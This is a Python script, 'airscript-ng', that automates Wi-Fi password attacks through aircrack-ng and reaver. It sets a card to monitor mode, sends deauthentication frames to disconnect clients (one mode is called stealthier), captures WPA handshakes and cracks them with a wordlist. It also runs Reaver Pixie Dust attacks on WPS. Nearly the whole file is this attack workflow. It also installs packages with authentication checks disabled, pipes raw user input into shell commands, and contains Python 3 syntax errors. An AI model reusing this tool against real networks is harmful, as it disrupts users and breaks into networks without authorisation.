#!/usr/bin/python3
def depandancies(): #This is fine 
    import os,time
    print("\033[1;33;48m[-] \033[0;37;48mUpdating system and installing some dependancies. Please hold!")
    os.system("sudo apt-get update --allow-unauthenticated > log.txt && sudo apt-get install apt -y --allow-unauthenticated > log.txt && sudo apt install xterm -y --allow-unauthenticated > log.txt")
    os.system("xterm $HOLD -title 'Installing any dependancies [aircrack-ng]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e sudo apt install gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 -y --allow-unauthenticated")
    time.sleep(2)
def check_depends(): #Still works
    import os,time
    array = ["xterm","gawk","reaver","aircrack-ng","wireless-tools","ethtool","apt-transport-https","iproute2"]
    for i in array[0:len(array)]:
        x = os.system("dpkg -l %s | awk -F ' ' {'print $2'} | grep -i '%s' >> log.txt" %(i,i))
        if x == 0:
            pass
        else:
            depandancies()            
def clearScreen(): #Needs fixing /less 
    import os
    if input("\033[1;34;48m[i] \033[1;37;48mPress 'y' to perform cleanup! >>").lower().startswith("y"):
        print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
        #print("deactivating monitor mode on %s" %(index))
        os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index)) 
        #os.system("echo 'activating NetworkManager and wpa_supplicant'")
        os.system("sudo systemctl start NetworkManager.service")
        os.system("sudo systemctl start wpa_supplicant.service")
        os.system("clear")
        if input("\n\033[1;37;48m[-] \033[0;38;48mPress [y] to exit or any other key to return to start>>").lower().startswith("y"):
            os.system("rm log.txt")
            os._exit(1)
        else:
            os.system("clear")
            title()
            os.system("rm log.txt")
    else:
        clearScreen()
def revert(): #revert repos is fine until apt-add solution is devised
    import os
    if os.system("ls -a backup-repos >> log.txt") == 0:
        os.system("sudo cp backup-repos/sources.list /etc/apt/sources.list")
        print("Successfully reverted repo back to what it was!")
        os.system("sudo apt update")
        print("If you don't see errors above then SOURCES file is ok.")
        clearScreen()
    else:
        print("Backup file not found!")
        clearScreen()
def install_deps(): #Needs a little bit of work
    import os
    os.system("clear")
    print("\033[1;32;48m[+] \033[1;35;48mThis option will append a few lines to your '/etc/apt/sources.list' file.")
    print("\033[1;34;48m[info] \033[1;37;48mAfter this the program will update the apt repos and install the dependancies")
    print("\033[1;37;48m[-] \033[1;33;48mPlease, Please remember that adding additional repos to debian is not advised.Since we'll only be adding the Kali-Rolling Repos, You should be fine! Do not run this on a KALI system!")
    tf = input("\033[1;33;48m[?] \033[0;37;48mPress [y] to proceed or CTRL+C to exit. >>")
    if tf.lower().startswith("y"):
        if os.system("iwconfig monitor") == 0:
            os.system("iw dev monitor del")
        else:
            pass
        if os.system("ls -a /etc/apt/sources.list >> log.txt") == 0:
            if os.system("ls -a backup-repos >> log.txt") !=0:   
                os.system("sudo mkdir backup-repos;cd backup-repos;cp /etc/apt/sources.list ./")
                com = os.system("sudo echo '#This line was added by airscript-ng, remove the line below if problems occur' >> /etc/apt/sources.list") 
                sou = os.system("sudo echo 'deb https://http.kali.org/kali kali-rolling main non-free contrib' >> /etc/apt/sources.list") 
                if com == 0 and sou == 0:
                    print("\033[1;32;48m[+] \033[1;35;48mAPT sources successfully added. If any problems occur remove last line from '/etc/apt/sources.list' file.")
                    depandancies()
                    print("Dependancies successfully installed! If you see errors above remove last line from '/etc/apt/sources.list' file, or use option 4 from the main-menu.")
                    clearScreen()
                else:
                    print("Problems occured when trying to add the repos, reverting to old repo.")
                    if input("Revert? y/n >>").lower().startswith("y"):
                        revert()
                    else:
                        clearScreen()
            else:
                print("Looks like Kali-repos have already been added.")
                depandancies()
        else:
            print("Are you sure this is a debian-based system?")
            print("I didn't find anything for '/etc/apt/sources.list'")
            print("Either your system doesn't use APT or isn't a debian based distro.")
            print("Please try something else.")
            input()
            clearScreen()
    else:
        install_deps()
def reaver():  #Needs major overhaul
    import os, time
    try:
        os.system('clear')
        print("\033[1;32;48m[+] \033[0;36;48mThanks for chossing reaver")
        print("\033[1;37;48m[-] \033[0;33;48mPlease note that Reaver-pixie dust method only works on very few WPS access points worldwide. This number is dwindlling and success chances are very low. That doesn't mean its all 'Doom and Gloom' ")
        print("\033[1;37;48m[+] \033[0;32;48mDespite the odds, when it works, it feels magical. Like the powers above sprinkled some pixie dust on your computer.")
        ack = input("\033[1;33;48m[?] \033[0;35;48mType 'y' to continue>>")
        if ack.lower().startswith('y'):
            print("\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
            check_depends()
            print("\033[1;33;48m[-] \033[0;35;48mAll dependancies are met ma dude. Make sure you have correct drivers! \033[0;37;48m")
            time.sleep(2)
            os.system('clear')
            print("""\033[0;36;48m

██████╗ ██╗██╗  ██╗██╗███████╗    ██████╗ ██╗   ██╗███████╗████████╗
██╔══██╗██║╚██╗██╔╝██║██╔════╝    ██╔══██╗██║   ██║██╔════╝╚══██╔══╝
██████╔╝██║ ╚███╔╝ ██║█████╗      ██║  ██║██║   ██║███████╗   ██║   
██╔═══╝ ██║ ██╔██╗ ██║██╔══╝      ██║  ██║██║   ██║╚════██║   ██║   
██║     ██║██╔╝ ██╗██║███████╗    ██████╔╝╚██████╔╝███████║   ██║   
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   


\033[1;33;48m[info] \033[0;32;48mDeveloped by Sh3llCod3, Using the reaver tool. 2017-2020. Use with legal caution, disclaimer applies.Thanks for using this program\n""")
            print("Ok lets put a Card in monitor mode\n")
            os.system("sudo systemctl stop NetworkManager.service")
            os.system("sudo systemctl stop wpa_supplicant.service")
            print("\033[1;32;48m[+] \033[0;37;48myour cards are:\n ")
            os.system("ls -1 /sys/class/net | grep ^wl")
            print("\n")
            index = input("\033[1;33;48m[?] \033[1;35;48mWhat card shall I put in monitor-mode/use? \033[1;32;48m(copy/paste) \033[1;35;48m>> ")
            index = str(index)
            global index
            os.system("ip link set %s down;iw dev %s set type monitor;ip link set %s up" %(index,index,index))
            print("\033[1;34;48m[info] \033[0;32;48mOk, seems like %s is started, time to get crackin'" %(index))
            print("\033[1;34;48m[info] \033[0;37;48mNow we'll run wash to find all the wps networks around")
            print("\033[1;34;48m[info] \033[0;33;48mPlease press CTRL+C once you see your target network")
            z = input("\033[0;34;48m\nGot all that? Press enter >>")
            z = str(z)
            os.system("wash -i %s" %(index))
            b = input("\n\033[1;33;48m[?] \033[0;34;48mJust copy+paste the bssid of the target network [no spaces]>>")
            b = str(b)
            c = input("\033[1;34;48m[?] \033[1;35;48mFinally tell me the channel of the target ap [look for Ch] >>")
            c = str(c)
            os.system("clear")
            def fix():
                print("\033[1;34;48m[info] \033[1;37;48mOnce you hit enter i'll attempt to pwn the wps using Reaver + Pixie dust.")
                print("\033[1;34;48m[info] \033[1;33;48mPlease note that this can backfire and lock the AP if left for too long")
                print("\033[1;34;48m[info] \033[1;35;48mIt should work in 15secs~30secs. If you see it running for more, then cancel it with CTRL+C.Don't risk it.Try again.")
                print("\033[1;34;48m\nHow do you want to run it? \033[1;32;48m[1] \033[1;34;48mto run normally or \033[1;32;48m[2] \033[0;34;48mto fix \033[1;31;48m'FAILED TO ASSOCIATE WITH AP'\033[0;34;48m")
                opt = input("\n\033[0;33;48mChoose either 1 or 2 >>")
                if opt == "1":
                    os.system("reaver -i %s -b %s -K 1 -vvv -c %s" %(index,b,c))
                    print("\033[1;34;48m\n[info] \033[1;35;48mBy now it has either worked or not. If it hasn't, well then i'm sorry. Please use the fix/aircrack-ng approach instead or if it has then CONGRATS ON FINDING THE PSK!")        
                    clearScreen()
                if opt == "2":
                    os.system("xterm $HOLD -title 'CLOSE ME ONCE DONE'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -geometry +2160 -e aireplay-ng -1 30 -a %s %s&reaver -i %s -b %s -K 1 -vvv -c %s -N -A " %(b,index,index,b,c))
                    print("\033[1;34;48m\n[info] \033[1;35;48mBy now it has either worked or not. If not then I'm sorry or if it has then CONGRATS ON FINDING THE PSK!")
                    print("\033[1;33;48m\n[info] \033[1;31;48mPlease close the Xterm at the top right now, as keeping it on is pretty much useless!")
                    clearScreen()
                else:
                    os.system("clear")
                    fix()
            fix()
        else:
            os.system('clear')
            reaver()
    except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
            print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
            #print("deactivating monitor mode on %s" %(index))
            os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index)) 
            #os.system("echo 'activating NetworkManager and wpa_supplicant'")
            os.system("sudo systemctl start NetworkManager.service")
            os.system("sudo systemctl start wpa_supplicant.service")
            os.system("clear")
            if input("\n\033[1;37;48m[-] \033[0;38;48mPress [y] to exit or any other key to return to start>>").lower().startswith("y"):
                os.system("rm log.txt")
                os._exit(1)
            else:
                os.system("clear")
                title()
                os.system("rm log.txt")
def aircrackng(): #Lots of effort needed 
    import os,time
    print("\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
    check_depends()
    print("\033[1;33;48m[-] \033[0;35;48mAll dependancies are met ma dude. Make sure you have correct drivers! \033[0;37;48m")
    time.sleep(2)		
    os.system("clear")
    while True:
        try:
            def mainScreen():
                print ("""
    \n\033[1;37;48m

 █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗     ███╗   ██╗ ██████╗ 
██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝     ████╗  ██║██╔════╝ 
███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝█████╗██╔██╗ ██║██║  ███╗
██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗╚════╝██║╚██╗██║██║   ██║
██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗     ██║ ╚████║╚██████╔╝
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ╚═╝  ╚═══╝ ╚═════╝ 


\033[1;33;48m[info] \033[0;32;48mDeveloped by Sh3llCod3, Using the Aircrack-ng tool. 2017-2020. Use with legal caution, disclaimer applies.\033[0;34;48m                                                                                  
    """)
                os.system("echo 'Starting...'")
                print("\nHi, welcome to aircrack-ng made easy")
                print("Please read everything that appears at the bottom")
                print("Thanks for using this program")
                os.system("sudo systemctl stop NetworkManager.service")
                os.system("sudo systemctl stop wpa_supplicant.service")
                print("\n\033[1;32;48m[+] \033[1;31;48myour cards are: \n")
                os.system("ls -1 /sys/class/net | grep ^wl")
                print("\n")
                index = input("\033[1;33;48m[?] \033[1;35;48mWhat card shall I put in monitor-mode/use? \033[1;32;48m(copy/paste) \033[1;35;48m>> ")
                index = str(index)
                global index
                os.system("ip link set %s down;iw dev %s set type monitor;ip link set %s up" %(index,index,index))
                print("\033[1;34;48m[info] \033[1;37;48m1) Ok, seems like %s is started, time to get crackin'" %(index))
                print("\033[1;34;48m[info] \033[1;34;48m2) now, we'll run Airodump-ng to capture the handshake")
                input("\033[1;34;48m[info] \033[1;33;48m3) once you start airodump, you need to press ctrl+c when you see your target network. \n\n\033[1;33;48m[?] press enter to continue >>")
                os.system("airodump-ng -a %s" %(index)) 
                print("Ok, all I need is a few things from you")
                b = input("\033[1;33;48m[?] \033[0;33;48mFirst, we'll create a new file to store the key in. What shall I call it? [no spaces/MAC addresses]>>")
                b = str(b)
                c = input("\033[1;33;48m[?] \033[0;34;48mNow, tell me the (copy/paste) channel {look at CH column} of the network [no spaces]>>")
                c = str(c)
                d = input("\033[1;33;48m[?] \033[0;36;48mFinally tell me the (copy/paste) bssid of the network [no spaces]>>")
                d = str(d)
                if b and c and d != "":
                    print("\033[1;32;48m[info] \033[0;31;48mNow, the idea is when someone connects/reconnects, we grab the password")
                    print("\033[0;32;48m[info] \033[0;34;48mThat's why we need to disconnect someone. You dont have to, you can wait for someone to connect or connect manually")
                    print("\033[0;37;48m[info] \033[0;33;48mYou can leave it blank to not disconnect anyone")
                    e = input("\n\033[1;35;40m[?] \033[1;35;48mHow many de-auths/disconnects shall I send? Don't use '0'! >>")
                    e = str(e)
                    print("\033[0;37;48m[info] \033[1;33;48mLook at the second column where it says bssid/station.")
                    print("\033[1;35;48m[info] \033[1;30;48mIf you don't have that then leave you'll have to de-auth everyone or not de-auth by leaving it blank.")
                    print("\033[1;34;48m[info] \033[0;36;48mYou can copy/paste a station address to de-auth/disconnect a specific device rather than all devices on the network")
                    print("\033[1;34;48m[info] \033[0;37;48mThis is a more stealthy as only one device is being disconnected.")
                    print("\033[1;34;48m[info] \033[0;37;48mplease ensure that the station (address) you copy/paste is connected to the the bssid you copied earlier [Look in the bssid column]")
                    print("It is optional but you can also leave this blank if you still don't get it")
                    g = input("\n\033[1;33;48m[?] \033[0;37;48mPlease copy/paste station (address) here or leave blank>>")
                    g = str(g)
                    def post_frame():
                        print("\n\033[1;34;48m[info] \033[0;32;48mIf you saw [WPA HANDSHAKE: %s] at the top right,then its time to crack the handshake." %(d))
                        print("\033[1;32;48m[info] \033[0;36;48mFirst make sure you have a wordlist which has the password in it ")
                        print("\033[1;34;48m[info] \033[0;34;48mPlease download or locate one ")
                        print("\033[1;36;48m[info] \033[0;33;48mHopefully the password will be in there or put it in there")
                        f = input("\n\033[1;32;48m[+] \033[0;37;48mDrag the wordlist on the terminal, literally!! use the file manager! [no spaces or Tabs]>>")
                        f = str(f)
                        print("\033[1;37;48m[info] \033[0;37;48mOk, ready? press enter to start cracking")
                        print("\033[1;30;48m[info] \033[0;37;48mIf nothing is found then ctrl+c and try again")
                        input("\033[1;33;48m[press enter]>>")
                        os.system("aircrack-ng %s-01.cap -w %s" %(b,f))
                        print("\n\n\033[1;32;48m[+] \033[0;37;48mLOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN!")
                        print("\033[1;32;48m[+] \033[0;37;48mCONGRATS IF YOU FIND THE PSK!")
                        clearScreen()
                    def standard():
                        os.system('clear')
                        input("\n\033[1;33;48m[?] \033[0;37;48mPRESS ENTER TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C!! THIS IS VITAL!! [press enter]>>" %(d))
                        os.system("iwconfig %s channel %s" %(index,c))
                        os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s -c %s %s --ignore-negative-one;airodump-ng -w %s -c %s --bssid %s --ignore-negative-one %s" %(e,d,g,index,b,c,d,index))
                        post_frame()
                    def broadcast_deauth():
                        os.system('clear')
                        input("\n\033[1;33;48m[?] \033[0;37;48mPRESS ENTER TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C!! THIS IS VITAL!! \n[press enter]>>" %(d))
                        os.system("iwconfig %s channel %s" %(index,c))
                        os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s %s --ignore-negative-one;airodump-ng -w %s -c %s --bssid %s --ignore-negative-one %s" %(e,d,index,b,c,d,index))
                        post_frame()
                    def no_deauth():
                        os.system('clear')
                        print("\033[1;37;40m[info] \033[0;34;48mOk, you have chosen not to disconnect anyone.")
                        print("\033[1;33;48m[info] \033[0;36;48mYou need to wait for someone to connect or connect manually yourself")
                        input("\033[1;36;48m[info] \033[0;33;48mReady? Hit enter to run. When you see WPA HANDSHAKE:%s at the top right press ctrl+c>>" %(d))
                        os.system("\niwconfig %s channel %s" %(index,c))
                        os.system("\nairodump-ng -w %s -c %s --bssid %s --ignore-negative-one %s" %(b,c,d,index))
                        post_frame()
                    if e != "" and g != "":
                        standard()
                    elif e != "" and g == "":
                        broadcast_deauth()
                    else:
                        no_deauth()
                else:
                    input("\033[1;37;40m[-] \033[0;37;48mYou missed something, try again, \n\033[1;33;48m[press enter]>>")
                    mainScreen()
            mainScreen()
        except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
            print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
            os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
            os.system("sudo systemctl start NetworkManager.service")
            os.system("sudo systemctl start wpa_supplicant.service")
            os.system("clear")
            if input("\n\033[1;37;48m[-] \033[0;38;48mPress [y] to exit or any other key to return to start>>").lower().startswith("y"):
                os.system("rm log.txt")
                os._exit(1)
            else:
                os.system("clear")
                title()
                os.system("rm log.txt")
def title(): #Works so far
    try:
        import os
        os.system('clear')
        print("\033[1;33;48m[?] \033[0;37;48mWhat tool would you like to use? Please run as root or after 'sudo su'")
        print("\033[1;35;48mType [1] - Aircrack-ng to crack WPA/WPA2")
        print("\033[1;34;48mType [2] - Reaver with pixie dust to crack WPS (rare vulnerability)")
        print("\033[1;37;48mType [3] - Add the Kali-Rolling Sources and install any dependancies")
        print("\033[1;31;48mType [4] - If you used option [3] and APT broke, use this to fix it")
        print("\033[1;33;48mType [5] - Update and upgrade all system packages")
        print("\n\n\033[1;37;40mType [99] - Exit ")
        selection = input("\033[0;35;48m\nPress 1, 2, 3, 4 or 5 >>")
        if selection == "1":
            aircrackng()
        elif selection == "2":
            reaver()
        elif selection == "3":
            install_deps()
        elif selection == "4":
            revert()
        elif selection == "5":
            import os
            os.system("clear")
            if input("\033[0;32;48m\n[+]\033[0;34;48mUpdate system and perform full-upgrade to system? \033[0;32;48m [y/n]\033[0;34;48m>>").lower().startswith("y"):
                os.system("sudo apt-get install xterm apt >> log.txt -y --allow-unauthenticated")
                os.system("sudo xterm $HOLD -title 'Updating, do not close!'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'apt update --allow-unauthenticated;apt full-upgrade -y --allow-unauthenticated;apt autoclean;apt autoremove -y --allow-unauthenticated' ")
                print("\033[0;32;48mSystem is up to date, Goodbye!")
                os.system("rm log.txt")
                os._exit(1)
            else:
                title()
        elif selection == "99":
            import os
            log = os.system("ls -a | grep -i 'log.txt' >> log.txt")
            if log == 0:
                os.system("rm log.txt")
            else:
                pass
            os._exit(1)
        else: 
            os.system('clear')
            title()
    except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
        print("\n")
        log = os.system("ls -a | grep -i 'log.txt' >> log.txt")
        if log == 0:
            os.system("rm log.txt")
        else:
            pass
        os._exit(1)
title()

